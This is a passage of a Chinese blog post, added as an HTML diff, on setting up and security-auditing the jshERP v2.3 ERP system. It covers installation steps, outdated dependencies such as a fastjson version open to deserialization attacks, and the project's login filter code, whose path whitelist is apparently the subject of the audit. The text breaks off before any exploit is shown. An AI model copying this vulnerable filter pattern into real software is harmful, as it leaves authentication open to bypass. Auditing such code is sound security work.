@@ -1,0 +1,1037 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="running">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="华夏-ERPv2.3搭建&amp;&amp;审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华夏-ERPv2.3搭建&amp;&amp;审计">
+<meta property="og:url" content="http://example.com/2025/10/27/%E5%8D%8E%E5%A4%8F-ERPv2.3%E6%90%AD%E5%BB%BA&%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="running">
+<meta property="og:description" content="华夏-ERPv2.3搭建&amp;&amp;审计">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164920568.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164909999.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910003.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164938988.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910006.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910011.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165024557.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165030075.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165031978.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165034376.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165036442.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165038106.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165039947.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165041609.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165043428.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165045737.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165049113.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165051098.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165052176.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165054113.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165150570.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165059147.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165101586.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165103672.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165105542.png">
+<meta property="og:image" content="https://lusensec.github.io/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020235518738.png">
+<meta property="article:published_time" content="2025-10-27T08:55:00.000Z">
+<meta property="article:modified_time" content="2025-10-27T08:56:57.349Z">
+<meta property="article:author" content="running">
+<meta property="article:tag" content="Java代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164920568.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>华夏-ERPv2.3搭建&amp;&amp;审计 - running</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>running</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="华夏-ERPv2.3搭建&amp;&amp;审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-27 16:55" pubdate>
+          2025年10月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">华夏-ERPv2.3搭建&amp;&amp;审计</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="华夏-ERPv2-3搭建"><a href="#华夏-ERPv2-3搭建" class="headerlink" title="华夏-ERPv2.3搭建"></a>华夏-ERPv2.3搭建</h1><p><strong>JDK</strong>：推荐 <code>JDK 1.8</code> 或 <code>11</code>（jkd1.8&#x3D;&#x3D;jdk8）</p>
+<p><strong>Maven</strong>：3.6+</p>
+<p><strong>Node.js + npm</strong>：前端构建需要，推荐 Node.js <code>14.x/16.x</code></p>
+<p><strong>数据库</strong>：MySQL 5.7 或 8.0（推荐 5.7）</p>
+<p><strong>IDE</strong>：IntelliJ IDEA </p>
+<h2 id="使用IDEA"><a href="#使用IDEA" class="headerlink" title="使用IDEA"></a>使用IDEA</h2><ol>
+<li><p>下载：下载地址（v2.3版本）：<a target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/releases">https://github.com/jishenghua/jshERP/releases</a> </p>
+</li>
+<li><p>导入到IDEA（记得配置java环境为1.8）（可以自己下载，也可以使用IDEA自带的）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164920568.png" srcset="/img/loading.gif" lazyload alt="image-20250822213808211"></p>
+</li>
+<li><p>配置数据库（可以先使用phpstudy创建数据库，导入文件<code>jsh_erp.sql</code>，再使用Navicat Premium 17连接数据库）</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164909999.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910003.png" srcset="/img/loading.gif" lazyload alt="image-20250822213200088"></p>
+<ol start="4">
+<li><p>使用 IDEA 打开项目，执行 <code>mvn clean install</code>，然后运行 <code>JshErpApplication.java</code> 主类即可启动。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164938988.png" srcset="/img/loading.gif" lazyload alt="image-20250822213723216"></p>
+<ul>
+<li><p><strong>Maven</strong> 的命令，用来：</p>
+<ul>
+<li><code>clean</code>：清理掉之前编译的文件</li>
+<li><code>install</code>：编译 + 打包项目，并把 jar&#x2F;war 包安装到本地 Maven 仓库</li>
+</ul>
+<p>先clean ，再install</p>
+</li>
+<li><p>JshErpApplication.java启动</p>
+<ul>
+<li><p>目录结构</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">jshERP-boot<br> └─ <span class="hljs-attribute">src</span><br>     └─ <span class="hljs-selector-tag">main</span><br>         └─ java<br>             └─ com<br>                 └─ jsh<br>                     └─ erp<br>                         └─ JshErpApplication<span class="hljs-selector-class">.java</span>   ← 启动类<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>路径</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">jshERP-boot<span class="hljs-regexp">/src/m</span>ain<span class="hljs-regexp">/java/</span>com<span class="hljs-regexp">/jsh/</span>erp/JshErpApplication.java<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910006.png" srcset="/img/loading.gif" lazyload alt="image-20250822213601489"></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>出现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027164910011.png" srcset="/img/loading.gif" lazyload alt="image-20250822213625370"></p>
+<p>说明启动成功（显示url，账号密码就可以自行测试啦）</p>
+</li>
+</ol>
+<h1 id="华夏-ERPv2-3审计"><a href="#华夏-ERPv2-3审计" class="headerlink" title="华夏-ERPv2.3审计"></a>华夏-ERPv2.3审计</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>华夏ERP-2.3 是一款面向中小企业的开源 ERP 系统，基于 <strong>SpringBoot + MyBatis</strong> 构建，前端采用 jQuery、EasyUI 和 AdminLTE。系统功能涵盖多个模块，能够满足中小企业日常经营管理需求。</p>
+<p>该版本特点是 <strong>开源、免费、易部署</strong>，支持多用户权限控制，适合学习、二次开发和中小企业信息化使用。但由于 v2.3 版本依赖库较旧，存在一定的 <strong>安全漏洞</strong>（如 SQL 注入、Fastjson 反序列化、XSS 等），实际部署时需注意升级和安全加固。</p>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>先大致浏览下整个项目的大致结构和配置信息</p>
+<p><strong>pom.xml</strong>：</p>
+<p>该文件用于管理：源代码、配置文件、开发者的信息和角色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等等。</p>
+<ol>
+<li><p>使用了1.2.55 版本的fastjson，具备fastjson 反序列化的版本要求</p>
+<p>（1.2.55～1.2.68以下存在FastJson <strong>绕过导致反序列化漏洞</strong>）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>了2.10.0 版本的log4j（emmmmm  但是这个版本是不存在漏洞的）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-to-slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.10.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>数据库使用了MyBatis</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.gitee.starblues<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springboot-plugin-framework-extension-mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.1-RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<p><strong>filter 配置</strong>：</p>
+<p>里面存放的应该是项目对应的拦截器过滤器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsh.erp.filter;<br><br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebInitParam;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;LogCostFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">        initParams = &#123;@WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">                      @WebInitParam(name = &quot;filterPath&quot;,</span><br><span class="hljs-meta">                              value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCostFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filterPath&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IGNORED_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ignoredUrl&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ignoredList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> String[] allowUrls;<br>    <span class="hljs-keyword">private</span> String[] ignoredUrls;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(FILTER_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;<br>            allowUrls = filterPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? filterPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;filterPath&#125;;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ignoredPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;<br>            ignoredUrls = ignoredPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;ignoredPath&#125;;<br>            <span class="hljs-keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;<br>                ignoredList.add(ignoredUrl);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span><br><span class="hljs-params">                         FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>        <span class="hljs-comment">//具体，比如：处理若用户未登录，则跳转到登录页</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//如果已登录，不阻止</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>            requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>            chain.doFilter(servletRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>        <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>            <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p>我们需要去到<code>doFilter()</code>方法中去看</p>
+<ul>
+<li><p>从session中提取user 参数的值，如果不为null，则跳过认证，这里是没有问题的</p>
